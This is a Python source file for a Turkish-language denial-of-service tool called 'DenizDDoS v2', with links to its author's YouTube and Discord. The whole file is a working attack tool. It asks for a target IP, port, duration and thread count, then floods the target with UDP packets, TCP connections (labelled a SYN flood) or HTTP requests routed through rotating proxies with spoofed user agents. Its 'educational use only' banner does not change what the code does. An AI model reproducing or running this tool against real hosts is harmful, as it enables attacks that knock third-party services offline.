from termcolor import colored
import sys
import os
import time
import socket
import random
import threading
import socks  # For SOCKS proxy support
import requests  # For HTTP with proxies

# Terminali temizle
os.system("clear")
os.system("figlet DenizDDoS")

print()
print(colored("https://www.youtube.com/@denizzqq4", 'cyan'))
print(colored("Discord: denizzqq4", 'magenta'))
print(colored("Davet : https://discord.gg/denizzqq", 'green'))
print(colored("DenizDDoS v2 - Sürüm: 2.0", 'yellow'))
print(colored("Gelişmiş DDOS - Proxy & UA Desteği!", 'red'))
print(colored("Sadece eğitim amaçlı. Yasal kullanım!", 'cyan'))
print()

# User Agents listesi (GoldenEye'dan örnekler - tam liste için useragents.txt yükle)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    # Daha fazla ekle - GoldenEye useragents klasöründen 1000+ var, buraya kısaltılmış
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
]

# Proxy listesi yükle (dosyadan)
proxies = []
def load_proxies(dosya_yolu):
    global proxies
    try:
        with open(dosya_yolu, 'r') as f:
            for satir in f:
                satir = satir.strip()
                if satir:
                    parcalar = satir.split(':')
                    if len(parcalar) >= 2:
                        ip, port = parcalar[0], parcalar[1]
                        tip = parcalar[2] if len(parcalar) > 2 else 'HTTP'
                        proxies.append({'ip': ip, 'port': int(port), 'type': tip})
        print(colored(f"{len(proxies)} proxy yüklendi!", 'green'))
    except FileNotFoundError:
        print(colored("Proxy dosyası bulunamadı. Proxy'siz devam.", 'yellow'))
        proxies = []

# Log fonksiyonu
def log_yaz(mesaj):
    with open('ddos_log.txt', 'a') as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {mesaj}\n")

# Hedef al
ip = input("Hedef IP girin: ")
try:
    port = int(input("Hedef port girin: "))
except ValueError:
    print(colored("Geçersiz port. Çıkılıyor...", "red"))
    sys.exit()

# Süre al
try:
    süre = int(input("Saldırı süresini saniye cinsinden girin: "))
except ValueError:
    print(colored("Geçersiz süre. Çıkılıyor...", "red"))
    sys.exit()

# Gelişmiş ayarlar
kullan_proxy = input(colored("Proxy kullanılacak mı? (E/H): ", "green")).lower() == 'e'
if kullan_proxy:
    proxy_dosya = input("Proxy dosyası yolu (proxies.txt): ") or "proxies.txt"
    load_proxies(proxy_dosya)

thread_sayisi = int(input("Thread sayısı (varsayılan 50): ") or 50)

if input(colored("UDP için random port? (E/H): ", "green")).lower() == 'e':
    random_port = True
else:
    random_port = False

udp_boyut = int(input("UDP paket boyutu (varsayılan 1024): ") or 1024)

log_yaz(f"Saldırı başlatılıyor: {ip}:{port} - Süre: {süre}s")

# UDP Flood (Threaded + Proxy yok, ama random port)
def udp_flood_thread(ip, port, mesaj, süre, thread_id):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if random_port:
        port = random.randint(1, 65535)
    baslangic = time.time()
    paket_sayisi = 0
    while time.time() - baslangic < süre:
        try:
            s.sendto(mesaj, (ip, port))
            paket_sayisi += 1
            if paket_sayisi % 100 == 0:
                print(colored(f"Thread {thread_id}: {paket_sayisi} paket", 'yellow'))
        except:
            pass
    s.close()

def udp_flood(ip, port, mesaj, süre, threads):
    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=udp_flood_thread, args=(ip, port, mesaj, süre / threads, i))
        t.start()
        threads_list.append(t)
    for t in threads_list:
        t.join()

# SYN Flood (Threaded)
def syn_flood_thread(ip, port, süre, thread_id):
    gonderilen = 0
    bitis = time.time() + süre
    while time.time() < bitis:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            gonderilen += 1
            if gonderilen % 50 == 0:
                print(colored(f"Thread {thread_id}: {gonderilen} SYN", 'yellow'))
            sock.close()
        except:
            pass

def syn_flood(ip, port, süre, threads):
    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=syn_flood_thread, args=(ip, port, süre / threads, i))
        t.start()
        threads_list.append(t)
    for t in threads_list:
        t.join()

# HTTP Flood (Proxy + Random UA)
def http_flood_thread(ip, port, süre, thread_id):
    gonderilen = 0
    bitis = time.time() + süre
    while time.time() < bitis:
        try:
            proxy = random.choice(proxies) if proxies else None
            ua = random.choice(user_agents)
            headers = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
            
            if proxy and proxy['type'] == 'SOCKS5':
                socks.set_default_proxy(socks.SOCKS5, proxy['ip'], proxy['port'])
                socket.socket = socks.socksocket
                requests.get(f"http://{ip}:{port}", headers=headers, timeout=1)
            elif proxy and proxy['type'] == 'HTTP':
                proxies_dict = {'http': f"http://{proxy['ip']}:{proxy['port']}", 'https': f"http://{proxy['ip']}:{proxy['port']}"}
                requests.get(f"http://{ip}:{port}", headers=headers, proxies=proxies_dict, timeout=1)
            else:
                requests.get(f"http://{ip}:{port}", headers=headers, timeout=1)
            
            gonderilen += 1
            if gonderilen % 50 == 0:
                print(colored(f"Thread {thread_id}: {gonderilen} HTTP", 'yellow'))
        except:
            pass

def http_flood(ip, port, süre, threads):
    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=http_flood_thread, args=(ip, port, süre / threads, i))
        t.start()
        threads_list.append(t)
    for t in threads_list:
        t.join()

# Menü
print(colored("\nSaldırı türünü seçin:", "green"))
print(colored("1. UDP Flood (Threaded + Random Port)", "cyan"))
print(colored("2. HTTP Flood (Proxy + Random UA)", "cyan"))
print(colored("3. SYN Flood (Threaded)", "cyan"))
secim = input(colored("Seçiminiz (1/2/3): ", "green"))

log_yaz(f"Seçim: {secim} - Threads: {thread_sayisi} - Proxy: {kullan_proxy}")

if secim == "1":
    mesaj = os.urandom(udp_boyut)  # Random payload
    print(colored("UDP v2 saldırısı başlatılıyor...", "red"))
    udp_flood(ip, port, mesaj, süre, thread_sayisi)
    print(colored("UDP v2 tamamlandı!", "red"))
elif secim == "2":
    print(colored("HTTP v2 saldırısı başlatılıyor... (UA: GoldenEye)", "red"))
    http_flood(ip, port, süre, thread_sayisi)
    print(colored("HTTP v2 tamamlandı!", "red"))
elif secim == "3":
    print(colored("SYN v2 saldırısı başlatılıyor...", "red"))
    syn_flood(ip, port, süre, thread_sayisi)
    print(colored("SYN v2 tamamlandı!", "red"))
else:
    print(colored("Geçersiz seçim. Çıkılıyor...", "red"))
    sys.exit()

log_yaz("Saldırı bitti.")
print(colored("Log: ddos_log.txt", "green"))
